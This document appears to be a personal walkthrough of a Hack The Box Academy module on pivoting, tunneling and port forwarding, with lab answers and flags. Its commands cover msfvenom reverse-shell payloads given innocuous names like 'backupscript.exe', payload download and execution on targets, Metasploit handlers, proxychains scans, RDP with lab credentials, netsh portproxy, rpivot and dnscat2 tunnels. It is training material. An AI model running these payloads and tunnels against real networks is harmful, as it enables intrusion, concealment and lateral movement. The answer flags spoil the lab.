# Pivoting, Tunneling, and Port Forwarding
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Pivoting, Tunneling, and Port Forwarding
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 2 days
* Date: 23-02-2023
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## The Networking Behind Pivoting
### Question 1:
![](./attachments/Pasted%20image%2020221124112751.png)

```shell-session
DjikstraCS@htb[/htb]$ ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 134.122.100.200  netmask 255.255.240.0  broadcast 134.122.111.255
        inet6 fe80::e973:b08d:7bdf:dc67  prefixlen 64  scopeid 0x20<link>
        ether 12:ed:13:35:68:f5  txqueuelen 1000  (Ethernet)
        RX packets 8844  bytes 803773 (784.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5698  bytes 9713896 (9.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
(...)
```

`134.122.100.200` is a public IP-address

**Answer:** `eth0`

### Question 2:
![](./attachments/Pasted%20image%2020221124112801.png)
*Hint: Consider how a routing table is used to make routing decisions. Destination IP address is very important.*

```shell-session
DjikstraCS@htb[/htb]$ netstat -r

Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         178.62.64.1     0.0.0.0         UG        0 0          0 eth0
10.10.10.0      10.10.14.1      255.255.254.0   UG        0 0          0 tun0
10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
10.106.0.0      0.0.0.0         255.255.240.0   U         0 0          0 eth1
10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
178.62.64.0     0.0.0.0         255.255.192.0   U         0 0          0 eth0
```

`10.129.x.x` is routed through interface `tun0`.

**Answer:** `tun0`

### Question 3:
![](./attachments/Pasted%20image%2020221124112809.png)
*Hint: Consider how a routing table is used if the destination IP network is not listed in the routing table.*

```shell-session
DjikstraCS@htb[/htb]$ netstat -r

Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         178.62.64.1     0.0.0.0         UG        0 0          0 eth0
10.10.10.0      10.10.14.1      255.255.254.0   UG        0 0          0 tun0
10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
10.106.0.0      0.0.0.0         255.255.240.0   U         0 0          0 eth1
10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
178.62.64.0     0.0.0.0         255.255.192.0   U         0 0          0 eth0
```

The default gateway has IP address `178.62.64.1`.

**Answer:** `178.62.64.1`

---
## Dynamic Port Forwarding with SSH and SOCKS Tunneling
### Question 1:
![](./attachments/Pasted%20image%2020221124115924.png)
*Hint: Submit that answer as a digit.*

```
┌──(kali㉿kali)-[~]
└─$ ssh ubuntu@10.129.204.127
The authenticity of host '10.129.204.127 (10.129.204.127)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.204.127' (ED25519) to the list of known hosts.
ubuntu@10.129.204.127's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 24 Nov 2022 11:07:46 AM UTC

  System load:             0.07
  Usage of /:              30.4% of 13.72GB
  Memory usage:            31%
  Swap usage:              0%
  Processes:               195
  Users logged in:         0
  IPv4 address for ens192: 10.129.204.127
  IPv6 address for ens192: dead:beef::250:56ff:feb9:34fd
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

147 updates can be applied immediately.
108 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 12 17:27:41 2022
ubuntu@WEB01:~$ ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.204.127  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb9:34fd  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:34fd  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:34:fd  txqueuelen 1000  (Ethernet)
        RX packets 5502  bytes 424000 (424.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 867  bytes 76244 (76.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:f170  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:f1:70  txqueuelen 1000  (Ethernet)
        RX packets 238  bytes 17885 (17.8 KB)
        RX errors 0  dropped 14  overruns 0  frame 0
        TX packets 255  bytes 17339 (17.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2184  bytes 171129 (171.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2184  bytes 171129 (171.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

There are three interfaces, incuding the loopback interface.

**Answer:** `3`

### Question 2:
![](./attachments/Pasted%20image%2020221124115933.png)
*Hint: Make sure your pivot is working successfully from your Attack host to the pivot host.*

Enable dynamic port forwarding.

```
┌──(kali㉿kali)-[~]
└─$ ssh -D 9050 ubuntu@10.129.184.140
```

Make sure `proychains` is set to port `9050`.

```
┌──(kali㉿kali)-[~]
└─$ tail -4 /etc/proxychains.conf
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

nmap via `proxychains`.

```
┌──(kali㉿kali)-[~]
└─$ proxychains nmap -v -sn 172.16.5.1-200  
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-24 06:50 EST
Initiating Ping Scan at 06:50
Scanning 200 hosts [2 ports/host]
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.2:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.8:80 <--socket error or timeout!
(...)
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.7:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.21:80 <--socket error or timeout!
(...)
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.115:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.129:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.136:80 <--socket error or timeout!
(...)
Completed Ping Scan at 07:00, 624.50s elapsed (200 total hosts)
Initiating Parallel DNS resolution of 200 hosts. at 07:00
Completed Parallel DNS resolution of 200 hosts. at 07:00, 0.63s elapsed
Nmap scan report for 172.16.5.1
Host is up (3.1s latency).
Nmap scan report for 172.16.5.2
Host is up (3.2s latency).
Nmap scan report for 172.16.5.3
Host is up (3.1s latency).
(...)
Host is up (3.1s latency).
Nmap scan report for 172.16.5.14
Host is up (3.2s latency).
Nmap scan report for 172.16.5.15
Host is up (3.2s latency).
Nmap scan report for 172.16.5.16
Host is up (3.2s latency).
Nmap scan report for 172.16.5.17
Host is up (3.2s latency).
Nmap scan report for 172.16.5.18
Host is up (3.1s latency).
Nmap scan report for 172.16.5.19
Host is up (0.092s latency).
(...)
Nmap scan report for 172.16.5.128
Host is up (3.2s latency).
Nmap scan report for 172.16.5.129
Host is up (0.080s latency).
Nmap scan report for 172.16.5.130
Host is up (3.2s latency).
(...)
Nmap done: 200 IP addresses (200 hosts up) scanned in 625.13 seconds
```

`172.16.5.19` and `172.16.5.129` seems to be up.

```
┌──(kali㉿kali)-[~]
└─$ proxychains nmap -v -Pn -sT 172.16.5.19
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-24 07:05 EST
Initiating Parallel DNS resolution of 1 host. at 07:05
Completed Parallel DNS resolution of 1 host. at 07:05, 0.09s elapsed
Initiating Connect Scan at 07:05
Scanning 172.16.5.19 [1000 ports]
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:21 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:995 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:111 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:443 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:256 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:445  ...  OK
Discovered open port 445/tcp on 172.16.5.19
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:587 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:139  ...  OK
Discovered open port 139/tcp on 172.16.5.19
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:22 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:135  ...  OK
Discovered open port 135/tcp on 172.16.5.19
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:199 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:80  ...  OK
Discovered open port 80/tcp on 172.16.5.19

(...)

[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:3306 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:53  ...  OK
Discovered open port 53/tcp on 172.16.5.19
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:3389  ...  OK
Discovered open port 3389/tcp on 172.16.5.19
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:113 <--socket error or timeout!

(...)

Completed Connect Scan at 07:06, 91.77s elapsed (1000 total ports)
Nmap scan report for 172.16.5.19
Host is up (0.085s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 91.89 seconds

```

```
┌──(kali㉿kali)-[~]
└─$ proxychains msfconsole
   
 ______________________________________
/ it looks like you're trying to run a \                                                                   
\ module                               /                                                                   
 --------------------------------------                                                                    
 \                                                                                                         
  \                                                                                                        
     __                                                                                                    
    /  \                                                                                                   
    |  |                                                                                                   
    @  @                                                                                                   
    |  |                                                                                                   
    || |/                                                                                                  
    || ||                                                                                                  
    |\_/|                                                                                                  
    \___/                                                                                                  


       =[ metasploit v6.2.23-dev                          ]
+ -- --=[ 2259 exploits - 1188 auxiliary - 402 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Save the current environment with the 
save command, future console restarts will use this 
environment again
Metasploit Documentation: https://docs.metasploit.com/
msf6 > search rdp_scanner

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
<

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rdp/rdp_scanner

msf6 > use 0
msf6 auxiliary(scanner/rdp/rdp_scanner) > options

Module options (auxiliary/scanner/rdp/rdp_scanner):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DETECT_NLA       true             yes       Detect Network Level Authentication (NLA)
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET =
                                                random
   RDP_DOMAIN                        no        The client domain name to report during connect
   RDP_USER                          no        The username to report during connect, UNSET = random
   RHOSTS                            yes       The target host(s), see https://github.com/rapid7/metasplo
                                               it-framework/wiki/Using-Metasploit
   RPORT            3389             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/rdp/rdp_scanner) > set RHOST 172.16.5.19
msf6 auxiliary(scanner/rdp/rdp_scanner) > run
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:3389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:3389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:3389  ...  OK

[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:INLANEFREIGHT) (domain_fqdn:inlanefreight.local) (server_fqdn:DC01.inlanefreight.local) (os_version:10.0.17763) (Requires NLA: No)
[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
┌──(kali㉿kali)-[~]
└─$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:3389  ...  OK
[07:11:42:375] [19774:19776] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:11:42:375] [19774:19776] [WARN][com.freerdp.crypto] - CN = DC01.inlanefreight.local
[07:11:44:687] [19774:19776] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[07:11:44:687] [19774:19776] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[07:11:44:703] [19774:19776] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[07:11:44:703] [19774:19776] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
```

And a RDP window opens. The flag is located on the desktop.

![](./attachments/Pasted%20image%2020221124131349.png)

Alternate way of connecting with RDP:

Enable dynamic port forwarding and make sure proxychans are confugured.

```
┌──(kali㉿kali)-[~]
└─$ ssh -D 9050 ubuntu@10.129.184.140
(...)
┌──(kali㉿kali)-[~]
└─$ tail -4 /etc/proxychains.conf
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050

┌──(kali㉿kali)-[~]
└─$ proxychains -q xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```


**Answer:** `N1c3Piv0t`

---
## Remote/Reverse Port Forwarding with SSH
### Question 1:
![](./attachments/Pasted%20image%2020230221105223.png)

Use `MFSvenom` to create a Windows payload.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 654 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Copy the payload to the Pivot host.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ scp backupscript.exe ubuntu@10.129.184.140:~/     
ubuntu@10.129.184.140's password: 
backupscript.exe                                                                   100% 7168   196.6KB/s   00:00 
```

Login the the pivot host with `ssh` and start a python webserver hosting the payload.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ ssh ubuntu@10.129.184.140                    
ubuntu@10.129.184.140's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
(...)
ubuntu@WEB01:~$ python3 -m http.server 8123
Serving HTTP on 0.0.0.0 port 8123 (http://0.0.0.0:8123/) ...
```

Now we need to RDP into the target. Enable dynamic port forwarding on the pivot host and make sure proxychans are confugured. Then connect.

```
┌──(kali㉿kali)-[~]
└─$ ssh -D 9050 ubuntu@10.129.184.140
(...)
┌──(kali㉿kali)-[~]
└─$ tail -4 /etc/proxychains.conf
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050

┌──(kali㉿kali)-[~]
└─$ proxychains -q xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

Download the payload from the http server hosted on the pivot host.

```
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Now we need to setup `metasploit` to recieve the callback from the payload.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ msfconsole -q                    
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8000
LPORT => 8000
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     0.0.0.0          yes       The local listener hostname
   LPORT     8000             yes       The local listener port
   LURI                       no        The HTTP Path

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: 306nwgsl) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: 306nwgsl) Staging x64 payload (201820 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: 306nwgsl) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1:39164) at 2023-02-21 04:44:19 -0500

meterpreter > shell
Process 6136 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
inlanefreight\victor
```

Answer is given in the section text.

**Answer:** `172.16.5.129`

### Question 2:
![](./attachments/Pasted%20image%2020230221105236.png)

Answer is given in the section text.

**Answer:** `0.0.0.0`

---
## Meterpreter Tunneling & Port Forwarding
### Question 1:
![](./attachments/Pasted%20image%2020230221114511.png)
*Hint: Try using each of the ping sweep methods shown in the section.*

Create a payload for linux.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.53 -f elf -o backupjob LPORT=8080
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

Copy the payload to the machine.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ scp backupjob ubuntu@10.129.50.188:~/                           
The authenticity of host '10.129.50.188 (10.129.50.188)' can't be established.
ubuntu@10.129.50.188's password: 
backupjob                                                                          100%  250     6.5KB/s   00:00 
```

Setup a listner for the payload with metasploit.

```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q                                                                                             
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8080
```

`ssh` into the Linux machine and execute the payload.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ ssh ubuntu@10.129.50.188  
ubuntu@10.129.50.188's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
(...)
Last login: Thu May 12 17:27:41 2022
ubuntu@WEB01:~$ ls
backupjob
ubuntu@WEB01:~$ chmod +x backupjob
ubuntu@WEB01:~$ ./backupjob
```

Recieve the callback in metepreter and run a ping sweep.

```
[*] Sending stage (3045348 bytes) to 10.129.50.188
[*] Meterpreter session 1 opened (10.10.15.53:8080 -> 10.129.50.188:52202) at 2023-02-21 05:35:52 -0500

meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
(...)
[+]     172.16.5.19 host found
(...)
[+]     172.16.5.129 host found
```

**Answer:** `172.16.5.19,172.16.5.129`

### Question 2:
![](./attachments/Pasted%20image%2020230221114520.png)
*Hint: Pay careful attention to the output generated when running AutoRoute.*

```
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.50.188
[*] Use the -p option to list all active routes
```

**Answer:** `172.16.5.0/255.255.254.0`

---
## Socat Redirection with a Reverse Shell
### Question:
![](./attachments/Pasted%20image%2020230221120205.png)

The answer is given in the section text.

`... without needing to use SSH tunneling.`

**Answer:** `False`

---
## Socat Redirection with a Bind Shell
### Question:
![](./attachments/Pasted%20image%2020230221120828.png)

We used `windows/x64/meterpreter/bind_tcp`.

**Answer:** `windows/x64/meterpreter/bind_tcp`

---
## Web Server Pivoting with Rpivot
### Question 1:
![](./attachments/Pasted%20image%2020230221123142.png)

The answer is given in the section text.

**Answer:** `Attack Host`

### Question 2:
![](./attachments/Pasted%20image%2020230221123200.png)

The answer is given in the section text.

**Answer:** `Pivot Host`

### Question 3:
![](./attachments/Pasted%20image%2020230221123210.png)

Download `rpivot` and launch the server version on the attack host.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ sudo git clone https://github.com/klsecservices/rpivot.git
[sudo] password for kali: 
Cloning into 'rpivot'...
remote: Enumerating objects: 37, done.
remote: Total 37 (delta 0), reused 0 (delta 0), pack-reused 37
Receiving objects: 100% (37/37), 51.20 KiB | 371.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ cd rpivot                                

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/rpivot]
└─$ ls
client.py  __main__.py  ntlm_auth  ordereddict.py  README.md  relay.py  server.py  six.py

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/rpivot]
└─$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 10.10.15.53
New connection from host 10.129.19.46, source port 60400
```

Copy `rpivot` to the pivot host, login with `ssh` and run the client version.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ scp -r rpivot ubuntu@10.129.19.46:~/     
ubuntu@10.129.19.46's password: 
(...)  
client.py                                                                                                 100%   21KB  49.3KB/s   00:00    
__main__.py                                                                                               100%  396    10.4KB/s   00:00    
server.py                                                                                                 100%   18KB 101.0KB/s   00:00      

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ ssh ubuntu@10.129.19.46  
ubuntu@10.129.19.46's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
(...)
Last login: Thu May 12 17:27:41 2022
ubuntu@WEB01:~$ cd rpivot/
ubuntu@WEB01:~/rpivot$ ls
client.py  __main__.py  ntlm_auth  ordereddict.py  README.md  relay.py  server.py  six.py
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.15.53 --server-port 9999
Backconnecting to server 10.10.15.53 port 9999
```

Now run `firefox-esr` using `proxychains`.

```
┌──(kali㉿kali)-[~]
└─$ proxychains firefox-esr 172.16.5.135:80
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
```

`firefox-esr` will launch and visit the webserver at `172.16.5.135`.

![](./attachments/Pasted%20image%2020230221125128.png)

**Answer:** `I_L0v3_Pr0xy_Ch@ins`

---
## Port Forwarding with Windows Netsh
### Question:
![](./attachments/Pasted%20image%2020230222101400.png)

`RDP` into the compromised host.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.50.177
```

Run `cmd.exe` and setup the pivot. 

```
Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.50.177 connectport=3389 connectaddress=172.16.5.19

```

Confirm the settings are correct.

```
C:\Windows\system32>netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.50.177   8080        172.16.5.19     3389
```

Now `RDP` into the DC via the pivot host.

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:victor /p:'pass@123' /v:10.129.50.177:8080

```

![](./attachments/Pasted%20image%2020230222104234.png)

**Answer:** `Jim Flipflop`

---
## DNS Tunneling with Dnscat2
### Question:
![](./attachments/Pasted%20image%2020230222112420.png)

Download and install `DNScat2`

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ git clone https://github.com/iagox86/dnscat2.git
Cloning into 'dnscat2'...
remote: Enumerating objects: 6617, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 6617 (delta 0), reused 5 (delta 0), pack-reused 6607
Receiving objects: 100% (6617/6617), 3.84 MiB | 13.06 MiB/s, done.
Resolving deltas: 100% (4564/4564), done.

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ cd dnscat2/server/

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/dnscat2/server]
└─$ gem install bundler
Fetching bundler-2.4.7.gem
ERROR:  While executing gem ... (Gem::FilePermissionError)
    You don't have write permissions for the /var/lib/gems/3.1.0 directory.

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/dnscat2/server]
└─$ sudo gem install bundler
[sudo] password for kali: 
Fetching bundler-2.4.7.gem
Successfully installed bundler-2.4.7
Parsing documentation for bundler-2.4.7
Installing ri documentation for bundler-2.4.7
Done installing documentation for bundler after 0 seconds
1 gem installed

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/dnscat2/server]
└─$ bundle install  
Using bundler 2.4.7
Using ecdsa 1.2.0
Using salsa20 0.1.1
Using sha3 1.0.1
Using trollop 2.1.2
Bundle complete! 4 Gemfile dependencies, 5 gems now installed.
Use `bundle info [gemname]` to see where a bundled gem is installed.
```

Run the `DNScat2` server on the attack host.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/dnscat2/server]
└─$ sudo ruby dnscat2.rb --dns host=10.10.15.176,port=53,domain=inlanefreight.local --no-cache

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.15.176:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=d866ecfb9007f418429a6d9499864114 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=d866ecfb9007f418429a6d9499864114

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2>
```

Now download `DNScat2 - powershell`.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
Cloning into 'dnscat2-powershell'...
remote: Enumerating objects: 191, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
